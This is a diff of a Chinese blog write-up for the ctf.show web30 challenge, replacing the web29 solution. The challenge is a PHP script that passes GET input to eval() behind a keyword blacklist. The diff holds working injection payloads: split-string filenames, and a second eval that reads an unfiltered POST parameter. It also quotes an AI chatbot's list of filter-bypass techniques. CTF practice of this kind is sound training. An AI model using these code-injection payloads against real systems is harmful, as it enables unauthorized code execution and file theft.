@@ -10,7 +10,7 @@
         let theme = localStorage.getItem("meek_theme") || "light";
         document.documentElement.setAttribute("data-color-mode", theme);
     </script>
-<meta name="description" content="题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
+<meta name="description" content="题目提示依然是`命令执行，需要严格的过滤`，但是这题加强了过滤，把单引号`'`和空格` `都过滤了
 ```php
 <?php
 
@@ -19,7 +19,7 @@
 # @Author: h1xa
 # @Date:   2020-09-04 00:12:34
 # @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-04 00:42:26
+# @Last Modified time: 2020-09-04 00:49:10
 # @email: h1xa@ctfer.com
 # @link: https://ctfer.com
 
@@ -28,7 +28,7 @@
 error_reporting(0);
 if(isset($_GET['c'])){
     $c = $_GET['c'];
-    if(!preg_match('/flag|system|php/i', $c)){
+    if(!preg_match('/flag|system|php|cat|sort|shell|\.| |\'/i', $c)){
         eval($c);
     }
     
@@ -36,47 +36,13 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__);
 }
 ```
-但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
+我让 Gemini 3.8 Flash 给我一些提示，它提到：
 
-```php
-$a='fla'; $b='g.php'; highlight_file($a.$b);
-```
-改造一下加上第三个变量：
-```php
-$a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
-```
+**1. 参数传递转义（引入外部变量）**
 
-浏览器自动 URL 编码后的 Payload：
-```
-/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
-```
-或者我们可以把空格去掉：
-```php
-$a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
-```
-浏览器自动 URL 编码后的 Payload 会更简单明了一点：
-```
-/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
-```
-获得的 flag：
-```php
-<?php
-
-/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-04 00:14:07
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-04 00:14:17
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/
-
-$flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
-```。">
+* `eval($c);` 执行的是一段 PHP 语句。">
 <meta property="og:title" content="WriteUp_web30_Web入门_ctf.show">
-<meta property="og:description" content="题目描述依然是`命令执行，需要严格的过滤`，代码中只是额外过滤了 `system` 和 `php`
+<meta property="og:description" content="题目提示依然是`命令执行，需要严格的过滤`，但是这题加强了过滤，把单引号`'`和空格` `都过滤了
 ```php
 <?php
 
@@ -85,7 +51,7 @@ $flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
 # @Author: h1xa
 # @Date:   2020-09-04 00:12:34
 # @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-04 00:42:26
+# @Last Modified time: 2020-09-04 00:49:10
 # @email: h1xa@ctfer.com
 # @link: https://ctfer.com
 
@@ -94,7 +60,7 @@ $flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
 error_reporting(0);
 if(isset($_GET['c'])){
     $c = $_GET['c'];
-    if(!preg_match('/flag|system|php/i', $c)){
+    if(!preg_match('/flag|system|php|cat|sort|shell|\.| |\'/i', $c)){
         eval($c);
     }
     
@@ -102,45 +68,11 @@ if(isset($_GET['c'])){
     highlight_file(__FILE__);
 }
 ```
-但是我上一题本来就没用 `system` 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：
+我让 Gemini 3.8 Flash 给我一些提示，它提到：
 
-```php
-$a='fla'; $b='g.php'; highlight_file($a.$b);
-```
-改造一下加上第三个变量：
-```php
-$a='fla'; $b='g.ph'; $c='p'; highlight_file($a.$b.$c);
-```
+**1. 参数传递转义（引入外部变量）**
 
-浏览器自动 URL 编码后的 Payload：
-```
-/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
-```
-或者我们可以把空格去掉：
-```php
-$a='fla';$b='g.ph';$c='p';highlight_file($a.$b.$c);
-```
-浏览器自动 URL 编码后的 Payload 会更简单明了一点：
-```
-/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
-```
-获得的 flag：
-```php
-<?php
-
-/*
-# -*- coding: utf-8 -*-
-# @Author: h1xa
-# @Date:   2020-09-04 00:14:07
-# @Last Modified by:   h1xa
-# @Last Modified time: 2020-09-04 00:14:17
-# @email: h1xa@ctfer.com
-# @link: https://ctfer.com
-
-*/
-
-$flag = 'ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}';
-```。">
+* `eval($c);` 执行的是一段 PHP 语句。">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://Ayx03.github.io/Gmeek/post/WriteUp_web30_Web-ru-men-_ctf.show.html">
 <meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
@@ -195,7 +127,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
         </svg>
     </a>
     
-    <a href="https://github.com/Ayx03/Gmeek/issues/58" target="_blank" class="btn btn-invisible circle" title="Issue">
+    <a href="https://github.com/Ayx03/Gmeek/issues/59" target="_blank" class="btn btn-invisible circle" title="Issue">
         <svg class="octicon" width="16" height="16">
             <path id="pathIssue" fill-rule="evenodd"></path>
         </svg>
@@ -211,7 +143,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 </div>
 </div>
     <div id="content">
-<div class="markdown-body" id="postBody"><p>题目描述依然是<code class="notranslate">命令执行，需要严格的过滤</code>，代码中只是额外过滤了 <code class="notranslate">system</code> 和 <code class="notranslate">php</code></p>
+<div class="markdown-body" id="postBody"><p>题目提示依然是<code class="notranslate">命令执行，需要严格的过滤</code>，但是这题加强了过滤，把单引号<code class="notranslate">'</code>和空格<code class="notranslate"> </code>都过滤了</p>
 <div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
 
 <span class="pl-c">/*</span>
@@ -219,7 +151,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <span class="pl-c"># @Author: h1xa</span>
 <span class="pl-c"># @Date:   2020-09-04 00:12:34</span>
 <span class="pl-c"># @Last Modified by:   h1xa</span>
-<span class="pl-c"># @Last Modified time: 2020-09-04 00:42:26</span>
+<span class="pl-c"># @Last Modified time: 2020-09-04 00:49:10</span>
 <span class="pl-c"># @email: h1xa@ctfer.com</span>
 <span class="pl-c"># @link: https://ctfer.com</span>
 <span class="pl-c"></span>
@@ -228,40 +160,74 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
 <span class="pl-en">error_reporting</span>(<span class="pl-c1">0</span>);
 <span class="pl-k">if</span>(<span class="pl-en">isset</span>(<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">c</span>'</span>])){
     <span class="pl-s1"><span class="pl-c1">$</span>c</span> = <span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_GET</span></span>[<span class="pl-s">'<span class="pl-s">c</span>'</span>];
-    <span class="pl-k">if</span>(!<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/flag|system|php/i</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>c</span>)){
+    <span class="pl-k">if</span>(!<span class="pl-en">preg_match</span>(<span class="pl-s">"<span class="pl-s">/flag|system|php|cat|sort|shell|\.| |\'/i</span>"</span>, <span class="pl-s1"><span class="pl-c1">$</span>c</span>)){
         <span class="pl-en">eval</span>(<span class="pl-s1"><span class="pl-c1">$</span>c</span>);
     }
     
 }<span class="pl-k">else</span>{
     <span class="pl-en">highlight_file</span>(<span class="pl-c1">__FILE__</span>);
 }</pre></div>
-<p>但是我上一题本来就没用 <code class="notranslate">system</code> 啊，我把 php 拆开写你不又炸了吗？上一题的 Payload：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.php</span>'</span>; <span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>);</pre></div>
-<p>改造一下加上第三个变量：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.ph</span>'</span>; <span class="pl-s1"><span class="pl-c1">$</span>c</span>=<span class="pl-s">'<span class="pl-s">p</span>'</span>; <span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>.<span class="pl-s1"><span class="pl-c1">$</span>c</span>);</pre></div>
-<p>浏览器自动 URL 编码后的 Payload：</p>
-<pre class="notranslate"><code class="notranslate">/?c=$a=%27fla%27;%20$b=%27g.ph%27;%20$c=%27p%27%20;highlight_file($a.$b.$c);
+<p>我让 Gemini 3.8 Flash 给我一些提示，它提到：</p>
+<p><strong>1. 参数传递转义（引入外部变量）</strong></p>
+<ul>
+<li><code class="notranslate">eval($c);</code> 执行的是一段 PHP 语句。黑名单只对传入的 <code class="notranslate">c</code> 参数生效，但它并不会检查其他 GET 或 POST 参数。</li>
+<li>思考：能否在 <code class="notranslate">$c</code> 中写一条语句，去动态接收并执行其他未受过滤检查的请求参数（比如 <code class="notranslate">$_POST</code> 或 <code class="notranslate">$_GET</code> 中的新键名）？</li>
+</ul>
+<p>之前我还真没想到还能这么玩，于是我写了：</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">/?c=<span class="pl-s1"><span class="pl-c1">$</span>d</span>=<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-c1">_POST</span></span>[<span class="pl-s">"<span class="pl-s">d</span>"</span>];<span class="pl-en">eval</span>(<span class="pl-s1"><span class="pl-c1">$</span>d</span>);</pre></div>
+<p>然后因为这个<code class="notranslate">$d</code>完全不会经过<code class="notranslate">preg_match</code>的过滤所以可以直接在 POST Body 里写</p>
+<pre class="notranslate"><code class="notranslate">d=highlight_file('flag.php');
 </code></pre>
-<p>或者我们可以把空格去掉：</p>
-<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>a</span>=<span class="pl-s">'<span class="pl-s">fla</span>'</span>;<span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s">'<span class="pl-s">g.ph</span>'</span>;<span class="pl-s1"><span class="pl-c1">$</span>c</span>=<span class="pl-s">'<span class="pl-s">p</span>'</span>;<span class="pl-en">highlight_file</span>(<span class="pl-s1"><span class="pl-c1">$</span>a</span>.<span class="pl-s1"><span class="pl-c1">$</span>b</span>.<span class="pl-s1"><span class="pl-c1">$</span>c</span>);</pre></div>
-<p>浏览器自动 URL 编码后的 Payload 会更简单明了一点：</p>
-<pre class="notranslate"><code class="notranslate">/?c=$a=%27fla%27;$b=%27g.ph%27;$c=%27p%27;highlight_file($a.$b.$c);
-</code></pre>
-<p>获得的 flag：</p>
+<p>使用 HackBar 发送请求即可获得 Flag</p>
 <div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
 
 <span class="pl-c">/*</span>
 <span class="pl-c"># -*- coding: utf-8 -*-</span>
 <span class="pl-c"># @Author: h1xa</span>
-<span class="pl-c"># @Date:   2020-09-04 00:14:07</span>
+<span class="pl-c"># @Date:   2020-09-04 00:49:19</span>
 <span class="pl-c"># @Last Modified by:   h1xa</span>
-<span class="pl-c"># @Last Modified time: 2020-09-04 00:14:17</span>
+<span class="pl-c"># @Last Modified time: 2020-09-04 00:49:26</span>
 <span class="pl-c"># @email: h1xa@ctfer.com</span>
 <span class="pl-c"># @link: https://ctfer.com</span>
 <span class="pl-c"></span>
 <span class="pl-c">*/</span>
 
-<span class="pl-s1"><span class="pl-c1">$</span>flag</span> = <span class="pl-s">'<span class="pl-s">ctfshow{3e3fd810-7c8a-4ce6-9871-ebd3cf9035d6}</span>'</span>;</pre></div></div>
+<span class="pl-s1"><span class="pl-c1">$</span>flag</span>=<span class="pl-s">"<span class="pl-s">ctfshow{7c3ee7af-f3d5-407b-801d-ca992bf85ffb}</span>"</span>;</pre></div>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/72f3a44b-0f8e-4197-afdf-3ca12aa43ba2"><img width="2000" height="1190" alt="Image" src="https://github.com/user-attachments/assets/72f3a44b-0f8e-4197-afdf-3ca12aa43ba2" style="max-width: 100%; height: auto; max-height: 1190px;; aspect-ratio: 2000 / 1190; background-color: var(--bgColor-muted); border-radius: 6px" class="js-gh-image-fallback"></a></p>
+<p>完整的 Gemini 3.8 Flash 回答：<br>
+面对这类字符过滤较多的 PHP 代码执行题目，核心思路通常不是直接硬刚所有黑名单，而是利用 <strong>PHP 语言特性</strong> 或 <strong>参数传递机制</strong> 来间接构造你想要的代码。</p>
+<p>这里提供几个思考方向作为提示：</p>
+<p><strong>1. 参数传递转义（引入外部变量）</strong></p>
+<ul>
+<li><code class="notranslate">eval($c);</code> 执行的是一段 PHP 语句。黑名单只对传入的 <code class="notranslate">c</code> 参数生效，但它并不会检查其他 GET 或 POST 参数。</li>
+<li>思考：能否在 <code class="notranslate">$c</code> 中写一条语句，去动态接收并执行其他未受过滤检查的请求参数（比如 <code class="notranslate">$_POST</code> 或 <code class="notranslate">$_GET</code> 中的新键名）？</li>
+</ul>
+<p><strong>2. 替代的命令执行与文件读取函数</strong></p>
+<ul>
+<li>黑名单过滤了 <code class="notranslate">system</code>、<code class="notranslate">cat</code>、<code class="notranslate">shell</code> 等常见词汇。</li>
+<li>PHP 中除了 <code class="notranslate">system</code>，还有很多其他执行系统命令的函数或机制（例如反引号、<code class="notranslate">passthru</code>、<code class="notranslate">exec</code> 等）。</li>
+<li>如果目标是读取文件内容，除了系统命令外，PHP 本身自带许多文件操作函数（如用于高亮显示文件、读取整个文件到数组或字符串的内置函数）。</li>
+</ul>
+<p><strong>3. 规避点号（<code class="notranslate">.</code>）与空格限制</strong></p>
+<ul>
+<li>
+<p><strong>点号的作用：</strong> 在 PHP 中点号常用于字符串拼接或文件名后缀（如 <code class="notranslate">.php</code>）。</p>
+</li>
+<li>
+<p>针对字符串拼接：双引号内的变量解析、数组索引拼接、函数传参等方式均可避免直接写 <code class="notranslate">.</code>。</p>
+</li>
+<li>
+<p>针对文件名匹配：在 Linux shell 中，通配符（如 <code class="notranslate">?</code> 或 <code class="notranslate">*</code>）可以匹配包括点号在内的任意字符。</p>
+</li>
+<li>
+<p><strong>空格替代：</strong> 在 PHP 语法中，括号、反引号、制表符（URL 编码 <code class="notranslate">%09</code>）等都可以起到分隔作用，许多地方本身就不强制需要普通空格。</p>
+</li>
+</ul>
+<p><strong>4. 字符串构造与函数动态调用</strong></p>
+<ul>
+<li>PHP 支持动态函数调用，例如 <code class="notranslate">$func = "fun" . "ction"; $func();</code>。</li>
+<li>哪怕不能使用点号连接，PHP 还支持利用十六进制编码（如 <code class="notranslate">"\x73\x79..."</code>）、取反（<code class="notranslate">~</code>）、异或（<code class="notranslate">^</code>）等位运算在不包含黑名单字符的情况下生成目标字符串。</li>
+</ul></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
